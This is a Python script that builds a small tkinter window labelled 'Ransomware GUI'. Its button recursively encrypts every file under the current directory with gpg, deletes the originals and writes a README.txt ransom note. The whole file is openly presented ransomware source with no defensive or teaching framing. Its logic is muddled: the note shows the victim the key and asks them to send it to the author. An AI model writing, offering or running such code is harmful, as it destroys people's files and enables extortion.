import tkinter as tk
from tkinter import messagebox
import os
import subprocess
import random
import string

def generate_encryption_key():
    key = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    return key

def encrypt_files(key):
    for root, dirs, files in os.walk('.'):
        for file in files:
            file_path = os.path.join(root, file)
            subprocess.call(['gpg', '--batch', '--yes', '--passphrase', key, '--cipher-algo', 'AES256', '--symmetric', file_path])
            os.remove(file_path)

def ransom_note(key):
    note = f"Your files have been encrypted with the following key: {key}\n"
    note += "To decrypt your files, please send the key to the ransomware author.\n"
    with open('README.txt', 'w') as f:
        f.write(note)

def encrypt_button_click():
    key = generate_encryption_key()
    encrypt_files(key)
    ransom_note(key)
    messagebox.showinfo("Encryption Complete", "Your files have been encrypted. Please send the key to the ransomware author.")

def main():
    root = tk.Tk()
    root.title("Ransomware GUI")
    root.geometry("300x100")

    encrypt_button = tk.Button(root, text="Encrypt Files", command=encrypt_button_click)
    encrypt_button.pack(pady=20)

    root.mainloop()

if __name__ == '__main__':
    main()